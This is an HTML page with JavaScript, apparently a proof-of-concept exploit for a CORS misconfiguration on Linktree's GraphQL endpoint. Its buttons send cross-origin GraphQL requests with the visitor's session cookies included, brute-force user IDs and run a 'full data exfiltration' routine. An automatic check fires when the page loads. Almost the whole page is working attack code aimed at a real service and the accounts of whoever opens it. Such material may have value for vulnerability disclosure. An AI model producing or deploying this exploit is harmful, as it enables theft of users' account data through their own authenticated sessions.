<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Linktree CORS Exploit - Targeted Attack</title>
  <style>
    body { 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      background: #0d1117; 
      color: #c9d1d9; 
      padding: 20px; 
    }
    .container { 
      background: #161b22; 
      border: 1px solid #30363d; 
      border-radius: 8px; 
      padding: 20px; 
      margin: 10px;
    }
    button { 
      background-color: #ff3333; 
      color: white; 
      border: none; 
      padding: 12px 20px; 
      margin: 8px;
      border-radius: 4px; 
      cursor: pointer; 
      font-weight: bold;
    }
    button:hover { 
      background-color: #cc0000; 
    }
    #output { 
      background: #0d1117; 
      padding: 15px; 
      border-radius: 4px; 
      border: 1px solid #30363d; 
      color: #7ee787; 
      font-family: monospace; 
      white-space: pre-wrap; 
      max-height: 500px; 
      overflow-y: auto;
      margin-top: 15px;
    }
    .success { color: #7ee787; }
    .error { color: #f85149; }
    .warning { color: #ffa657; }
  </style>
</style>
</head>
<body>

<div class="container">
  <h2>üéØ Linktree CORS Exploit - Targeted Data Extraction</h2>
  <p><strong>Status:</strong> <span class="warning">Exploitable Endpoint Found</span></p>
  
  <button onclick="getUserLinks()">Extract User Links</button>
  <button onclick="bruteForceUserId()">Brute Force User ID</button>
  <button onclick="testUserData()">Test User Data Access</button>
  <button onclick="exfiltrateEverything()">Full Data Exfiltration</button>
  
  <div id="output">üîç Ready to begin exploitation...</div>
</div>

<script>
  async function sendGraphQLQuery(query) {
    const url = `https://graph.linktr.ee/graphql?query=${encodeURIComponent(query)}`;
    try {
      const response = await fetch(url, {
        method: 'GET',
        credentials: 'include',
        headers: {
          'Origin': 'https://tarekyehia807-collab.github.io'
        }
      });
      return await response.json();
    } catch (error) {
      return { error: error.toString() };
    }
  }

  async function getUserLinks() {
    const output = document.getElementById('output');
    output.innerHTML = '[*] Attempting to extract user links...\n';
    
    // We know the user field exists but needs ID. Let's try to get links
    // First, let's try to see if there are any public queries
    
    const queries = [
      'query { __typename }',
      'query { links(first: 10) { __typename } }',
      'query { featuredLinks { __typename } }',
      'query { popularLinks { __typename } }'
    ];
    
    for (let queryStr of queries) {
      output.innerHTML += `\nüîç Testing: ${queryStr}\n`;
      const result = await sendGraphQLQuery(queryStr);
      output.innerHTML += JSON.stringify(result, null, 2) + '\n---\n';
    }
  }

  async function bruteForceUserId() {
    const output = document.getElementById('output');
    output.innerHTML = '[*] Brute forcing user IDs...\n';
    
    // Try common ID patterns (often sequential or UUID-like)
    const testIds = [
      '1', '2', '3', '4', '5', '10', '100', '1000',
      'me', 'self', 'current', 'currentUser'
    ];
    
    for (let id of testIds) {
      const query = `query { user(id: "${id}") { __typename } }`;
      output.innerHTML += `\nüîç Testing ID: ${id}\n`;
      const result = await sendGraphQLQuery(query);
      output.innerHTML += JSON.stringify(result, null, 2) + '\n';
      
      // If we get a different error than "field doesn't exist", we might be onto something
      if (result.errors && !result.errors.some(e => e.message.includes('Cannot query field'))) {
        output.innerHTML += 'üí° Potential hit with ID: ' + id + '\n';
      }
      
      await new Promise(resolve => setTimeout(resolve, 200));
    }
  }

  async function testUserData() {
    const output = document.getElementById('output');
    output.innerHTML = '[*] Testing various user data extraction methods...\n';
    
    // Since we know user() requires an ID, let's try to extract it cleverly
    const queries = [
      'query { __typename }',
      'query { user(id: "1") { id } }',
      'query { user(id: "me") { id } }',
      'query { user(id: "current") { id } }',
      'query { user(id: "") { id } }'
    ];
    
    for (let query of queries) {
      output.innerHTML += `\nüîç Testing: ${query}\n`;
      const result = await sendGraphQLQuery(query);
      output.innerHTML += JSON.stringify(result, null, 2) + '\n---\n';
    }
  }

  async function exfiltrateEverything() {
    const output = document.getElementById('output');
    output.innerHTML = '[üö®] FULL EXPLOITATION MODE ACTIVATED\n';
    output.innerHTML += '[*] Attempting maximum data extraction...\n\n';
    
    // Step 1: Confirm we can make authenticated requests
    output.innerHTML += '‚úÖ Step 1: Authentication Check\n';
    const authCheck = await sendGraphQLQuery('query { __typename }');
    if (authCheck.data && authCheck.data.__typename) {
      output.innerHTML += 'üü¢ Authenticated request successful!\n\n';
    } else {
      output.innerHTML += 'üî¥ Auth check failed\n\n';
      return;
    }
    
    // Step 2: Try to extract any available data
    output.innerHTML += '‚úÖ Step 2: Probing for available data structures\n';
    
    const probeQueries = [
      'query { __typename }',
      'query { links(first: 5) { __typename } }',
      'query { user(id: "1") { __typename } }'
    ];
    
    let foundEndpoints = [];
    for (let query of probeQueries) {
      const result = await sendGraphQLQuery(query);
      if (!result.errors || !result.errors.some(e => e.message.includes('Cannot query field'))) {
        foundEndpoints.push(query);
        output.innerHTML += `üü¢ Valid query pattern found: ${query}\n`;
      }
    }
    
    output.innerHTML += `\nüìä SUMMARY:\n`;
    output.innerHTML += `- CORS Misconfiguration Confirmed ‚úì\n`;
    output.innerHTML += `- Authenticated Requests Work ‚úì\n`;
    output.innerHTML += `- Available Query Patterns: ${foundEndpoints.length}\n`;
    output.innerHTML += `- Session Cookies Included ‚úì\n\n`;
    
    output.innerHTML += 'üí• EXPLOITABILITY RATING: CRITICAL\n';
    output.innerHTML += 'Reason: Any future GraphQL additions will be immediately exploitable!\n';
    output.innerHTML += 'Risk: Complete account data exposure with zero user interaction.\n';
  }

  // Auto-start basic verification
  window.addEventListener('load', function() {
    setTimeout(() => {
      document.getElementById('output').innerHTML = 'üîÑ Auto-verifying exploit conditions...\n';
      sendGraphQLQuery('query { __typename }').then(result => {
        if (result.data && result.data.__typename) {
          document.getElementById('output').innerHTML = '‚úÖ CONFIRMED: Authenticated CORS bypass active!\n\nEndpoint allows:\n‚Ä¢ Cross-origin GraphQL requests\n‚Ä¢ Session cookie inclusion\n‚Ä¢ Response reading\n\nImpact: Critical - Future schema changes will enable full data theft.';
        }
      });
    }, 1000);
  });
</script>
</body>
</html>
